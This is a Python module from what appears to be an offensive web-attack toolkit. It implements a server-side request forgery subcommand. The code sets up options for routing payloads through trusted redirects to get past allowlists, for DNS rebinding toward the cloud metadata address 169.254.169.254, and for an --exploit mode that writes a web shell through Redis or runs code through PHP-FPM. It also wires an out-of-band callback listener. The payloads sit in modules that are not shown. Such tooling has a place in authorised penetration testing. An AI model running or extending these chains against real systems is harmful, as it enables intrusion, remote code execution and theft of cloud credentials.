"""SSRF: prove the fetch, map what it can reach, pick the follow-up.

    python injectorkit.py ssrf -u "http://target/fetch?url=http://example.com"
    python injectorkit.py ssrf -u "http://target/fetch?url=x" --param url --oob 10.0.0.5:8081

Without a listener the blind paths are skipped rather than sent, because a
callback that can never arrive is not a test.
"""

from __future__ import annotations

import argparse

from ...core.httpmsg import Request
from ...core.params import Param
from ...core.protocols import rebind_host
from ...engine.blackboard import Blackboard
from ...engine.bypass import Bypass
from ...engine.evidence import Judge
from ...engine.runner import (
    baseline_body,
    close_board,
    close_filters,
    collect_targets,
    open_board,
    open_filters,
    run_targets,
    select_params,
)
from ...engine.statemachine import Engine, RunContext
from . import mutators as _mutators  # noqa: F401  (registers this module's mutators)
from .graph import build_graph
from .seeds import LIKELY_PARAMS

NAME = "ssrf"
HELP = "server-side request forgery: prove a fetch, fingerprint internal services, choose the next step"


def add_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("-u", "--url", help="target URL, including the parameter to attack")
    parser.add_argument("-r", "--request", help="a raw HTTP request captured from a proxy")
    parser.add_argument("--param", help="parameter to inject into (default: pick the likely ones)")
    parser.add_argument("--max-params", type=int, default=6, help="how many parameters to try")
    parser.add_argument(
        "--via",
        action="append",
        metavar="URL",
        help="route every payload through a host the target trusts, with {target} standing for the "
        "real destination, e.g. 'http://allowed/redirect?to={target}'. A whitelisting filter cannot be "
        "walked past by spelling anything differently - this is the way past it",
    )

    exploit = parser.add_argument_group("exploitation")
    exploit.add_argument(
        "--exploit",
        action="store_true",
        help="act on fingerprinted services: write a file through Redis, or run code through PHP-FPM",
    )
    exploit.add_argument("--webroot", metavar="DIR", help="a web-accessible directory on the target, for the Redis chain")
    exploit.add_argument("--shell-name", metavar="FILE", help="filename to write the shell as")
    exploit.add_argument("--fpm-script", metavar="PATH", help="a PHP file that exists on the target, for the PHP-FPM chain")
    exploit.add_argument("--fpm-port", type=int, default=9000, help="PHP-FPM port (default: 9000)")

    parser.add_argument(
        "--rebind",
        metavar="INTERNAL,EXTERNAL",
        help="try each destination again under a DNS name that alternates between an internal "
        "address and an external one, e.g. '169.254.169.254,192.168.44.1'. This is what gets past "
        "a check that resolves the name once and connects later",
    )


def _rebind_name(value: str | None) -> str:
    """Turn `--rebind INTERNAL,EXTERNAL` into a name that alternates between them."""
    if not value:
        return ""
    parts = [piece.strip() for piece in value.split(",")]
    if len(parts) != 2 or not all(parts):
        raise SystemExit("--rebind expects INTERNAL,EXTERNAL, for example 169.254.169.254,192.168.44.1")
    return rebind_host(parts[0], parts[1])


def run(args: argparse.Namespace, runtime) -> int:
    # One walk over targets, the engine's. This module used to re-implement it,
    # and the copy quietly lost `extra_headers` - so a header named with -H was
    # injectable in one subcommand and invisible in this one - along with the
    # per-target listing the engine's failure message prints.
    return run_targets(args, runtime, NAME, LIKELY_PARAMS, run_one)


def run_one(request: Request, params: list[Param], args: argparse.Namespace, runtime) -> None:
    blackboard = open_board(args, runtime, request)
    body, spread, steady = baseline_body(runtime.transport, request, blackboard.count_request)
    if not steady:
        runtime.warn(
            "the page answers two identical requests differently, so a change in it "
            "cannot be told apart from its own noise"
        )
    context = RunContext(
        graph=build_graph(NAME),
        transport=runtime.transport,
        blackboard=blackboard,
        judge=Judge(
            baseline=body,
            baseline_spread=spread,
            on_echo=lambda: runtime.warn(
                "the page reflects the parameter value back; every payload changes the "
                "response, so the reflection is filtered out before matching"
            ),
        ),
        bypass=open_filters(args, runtime, request, blackboard),
        oob=runtime.oob,
        pheromone=runtime.pheromone,
        config={
            "request": request,
            "params": params,
            "oob_wait": args.oob_wait,
            "traceback": args.verbose > 1,
            "via": args.via or [],
            "exploit": args.exploit,
            "webroot": args.webroot,
            "shell_name": args.shell_name,
            "fpm_script": args.fpm_script,
            "fpm_port": args.fpm_port,
            "rebind": _rebind_name(args.rebind),
        },
        log=runtime.log,
        emit=runtime.emit,
        info=runtime.info,
        max_requests=args.max_requests,
    )

    try:
        Engine(context.graph, context).run()
    finally:
        # Written even when the run is interrupted. What was learned before a
        # Ctrl+C is exactly what a resumed run needs, and dropping it means the
        # next attempt pays for all of it again - while the priors, which are
        # cheap to recompute, were being saved all along.
        runtime.emit("")
        runtime.emit(blackboard.render())
        points = blackboard.render_findings()
        if points:
            runtime.emit("")
            runtime.emit(points)
        close_board(args, blackboard, request)
        close_filters(args, context.bypass, request)
